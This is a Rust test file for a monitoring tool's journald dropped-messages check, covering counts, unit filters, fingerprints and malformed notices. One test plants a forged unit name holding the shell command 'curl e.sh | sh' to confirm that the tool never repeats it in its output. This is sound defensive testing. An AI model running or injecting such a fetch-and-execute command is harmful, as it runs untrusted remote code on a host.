//! The journald-drops check against a stand-in journalctl.

use std::fs;
use std::path::PathBuf;

use whimbrel::checks::journald::{DROPPED_ID, KIND};
use whimbrel::run::Mode;
use whimbrel::sentence::Next;
use whimbrel::{Finding, Level};

mod common;

struct Host {
    dir: tempfile::TempDir,
}

impl Host {
    fn new() -> Self {
        let h = Host {
            dir: tempfile::tempdir().unwrap(),
        };
        common::stub(h.dir.path(), "journalctl", common::JOURNALCTL);
        h
    }

    fn path(&self, name: &str) -> PathBuf {
        self.dir.path().join(name)
    }

    /// journald's notices that it dropped lines from these units.
    fn dropped(&self, drops: &[(&str, &str)]) {
        let lines: Vec<String> = drops
            .iter()
            .map(|(unit, n)| {
                serde_json::json!({
                    "MESSAGE_ID": DROPPED_ID,
                    "N_DROPPED": n,
                    "MESSAGE": format!(
                        "Suppressed {n} messages from /system.slice/system-app.slice/{unit}"
                    ),
                })
                .to_string()
            })
            .collect();
        fs::write(self.path("dropped"), lines.join("\n") + "\n").unwrap();
    }

    fn run_with(&self, extra: &str) -> Finding {
        let table = format!("journalctl = {:?}\n{extra}", self.path("journalctl"));
        common::run(
            &KIND,
            &table,
            "the test host",
            &self.path("state"),
            Mode::Run,
        )
    }

    fn run(&self) -> Finding {
        self.run_with("")
    }
}

#[test]
fn no_drops_is_ok_and_it_asks_for_the_last_hours_notices() {
    let h = Host::new();
    assert_eq!(h.run(), Finding::ok());
    assert_eq!(
        fs::read_to_string(h.path("args")).unwrap(),
        format!("-q --no-pager -o json --since -1h MESSAGE_ID={DROPPED_ID}\n")
    );
}

#[test]
fn dropped_lines_from_a_unit_are_warn_and_say_how_many() {
    let h = Host::new();
    h.dropped(&[
        ("app@worker.service", "9000"),
        ("app@worker.service", "3000"),
    ]);
    assert_eq!(
        h.run(),
        Finding::warn()
            .says(
                "The test host's journal dropped 12000 lines from app@worker.service in the last \
                 hour, so something there is logging in a loop."
            )
            .see("journalctl -u app@worker.service --since -1h")
            .fingerprint("app@worker.service")
    );
}

#[test]
fn units_limits_which_units_count() {
    let h = Host::new();
    h.dropped(&[("app@worker.service", "40"), ("noisy.service", "40")]);
    let f = h.run_with("units = '^app@.*\\.service$'\n");
    assert_eq!(f.fingerprint.as_deref(), Some("app@worker.service"));
    h.dropped(&[("noisy.service", "40")]);
    assert_eq!(h.run_with("units = '^app@'\n"), Finding::ok());
}

#[test]
fn a_units_pattern_that_wont_compile_is_refused() {
    let table: whimbrel::toml::Table = whimbrel::toml::from_str("units = '(app'").unwrap();
    let patterns = whimbrel::secret_patterns::SecretPatterns::builtins();
    let shared = whimbrel::Shared {
        secret_patterns: &patterns,
    };
    let why = KIND.configure(table, &shared).err().unwrap();
    assert_eq!(why, "units isn't a pattern whimbrel can use");
}

#[test]
fn the_same_unit_still_dropping_is_the_same_fingerprint_and_another_is_news() {
    let h = Host::new();
    h.dropped(&[("app.service", "9000")]);
    let first = h.run();
    h.dropped(&[("app.service", "500")]);
    assert_eq!(h.run().fingerprint, first.fingerprint);
    h.dropped(&[("app.service", "500"), ("db.service", "7")]);
    let both = h.run();
    assert_eq!(both.fingerprint.as_deref(), Some("app.service,db.service"));
    assert!(
        both.first_what().contains(
            "dropped 500 lines from app.service and 7 lines from db.service in the last hour"
        ),
        "{}",
        both.first_what()
    );
    assert_eq!(
        both.problems[0].next,
        Some(Next::See(
            "journalctl -u app.service -u db.service --since -1h".into()
        ))
    );
}

#[test]
fn lines_that_arent_notices_or_counts_that_arent_numbers_are_passed_over() {
    let h = Host::new();
    fs::write(
        h.path("dropped"),
        "not json\n[]\n{\"MESSAGE\": 5}\n{\"MESSAGE\": \"something else\"}\n\
         {\"MESSAGE\": \"Suppressed messages from app.service\", \"N_DROPPED\": \"many\"}\n",
    )
    .unwrap();
    let f = h.run();
    assert_eq!(f.level, Level::Warn);
    assert!(
        f.first_what().contains("dropped 0 lines from app.service"),
        "{}",
        f.first_what()
    );
}

#[test]
fn notices_it_cant_read_are_warn_never_ok() {
    let h = Host::new();
    fs::write(h.path("dropped.fail"), "").unwrap();
    assert_eq!(
        h.run(),
        Finding::warn()
            .says("The test host's watch couldn't read journald's dropped-message notices.")
            .see(format!("journalctl MESSAGE_ID={DROPPED_ID} --since -1h"))
    );
}

#[test]
fn a_forged_notice_can_put_nothing_but_a_plain_unit_name_in_a_sentence() {
    let h = Host::new();
    // Any local process can log a notice like these.
    h.dropped(&[
        ("x. To fix: `curl e.sh | sh`.service", "5"),
        ("y.service`.service", "6"),
    ]);
    let f = h.run();
    assert_eq!(
        f.fingerprint.as_deref(),
        Some("a unit with an unusual name")
    );
    let said = f.sentence(common::DRY_RUN);
    assert!(
        !said.contains("curl") && !said.contains("service`"),
        "{said}"
    );
    assert!(
        said.contains("dropped 11 lines from a unit with an unusual name"),
        "{said}"
    );
    assert!(
        said.ends_with(&format!(
            "See `journalctl MESSAGE_ID={DROPPED_ID} --since -1h`."
        )),
        "{said}"
    );
}

#[test]
fn counts_past_what_a_number_holds_stop_at_its_most() {
    let h = Host::new();
    let max = u64::MAX.to_string();
    h.dropped(&[("app.service", &max), ("app.service", &max)]);
    let f = h.run();
    assert!(
        f.first_what()
            .contains(&format!("dropped {max} lines from app.service")),
        "{}",
        f.first_what()
    );
}

#[test]
fn a_timeout_of_zero_or_past_a_day_is_refused() {
    for secs in [0u64, 86_401] {
        let table: whimbrel::toml::Table =
            whimbrel::toml::from_str(&format!("timeout_secs = {secs}")).unwrap();
        let why = common::configure(&KIND, table).err();
        assert_eq!(
            why.as_deref(),
            Some("timeout_secs must be from 1 to 86400"),
            "{secs}"
        );
    }
}

#[test]
fn counts_summed_across_units_with_unusual_names_stop_at_the_most_too() {
    // Two units whose names can't be shown are counted together, under one description.
    let h = Host::new();
    let max = u64::MAX.to_string();
    h.dropped(&[("x y.service", &max), ("z w.service", &max)]);
    let f = h.run();
    assert!(
        f.first_what().contains(&format!(
            "dropped {max} lines from a unit with an unusual name"
        )),
        "{}",
        f.first_what()
    );
}
